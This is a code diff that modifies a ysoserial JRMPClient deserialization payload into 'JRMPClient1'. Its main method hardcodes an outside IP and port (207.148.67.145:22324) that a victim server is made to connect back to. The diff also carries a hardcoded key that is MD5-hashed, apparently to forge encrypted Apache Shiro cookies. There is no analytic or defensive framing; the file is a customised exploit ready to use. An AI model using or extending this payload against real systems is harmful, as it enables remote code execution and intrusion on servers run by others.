@@ -7,7 +7,6 @@ import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObjectInvocationHandler;
 import java.util.Base64;
 import java.util.Random;
-
 import java.util.UUID;
 import org.apache.shiro.crypto.CryptoException;
 import org.apache.shiro.crypto.hash.Md5Hash;
@@ -56,11 +55,11 @@ import ysoserial.payloads.util.PayloadRunner;
 @SuppressWarnings ( {
     "restriction"
 } )
-@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
+@PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
 @Authors({ Authors.MBECHLER })
-public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
+public class JRMPClient1 extends PayloadRunner implements ObjectPayload<Object> {
 
-    public Registry getObject ( final String command ) throws Exception {
+    public Object getObject ( final String command ) throws Exception {
 
         String host;
         int port;
@@ -76,19 +75,18 @@ public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry>
         ObjID id = new ObjID(new Random().nextInt()); // RMI registry
         TCPEndpoint te = new TCPEndpoint(host, port);
         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
-        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
-        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
-            Registry.class
-        }, obj);
-        return proxy;
+        return ref;
     }
 
 
+//    public static void main ( final String[] args ) throws Exception {
+//        PayloadRunner.run(JRMPClient1.class, args);
+//    }
+
     public static void main(final String[] args1) throws Exception {
-        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
         String[] args = new String[]{"207.148.67.145:22324"};
         PayloadRunner.runDeserialize = false;
-        PayloadRunner.run(JRMPClient.class, args);
+        PayloadRunner.run(JRMPClient1.class, args);
 
         String key = "wR&_(NVG#c&9(CDhaDMZELDmxSe(mwbB";
         key = new Md5Hash(key).toString();
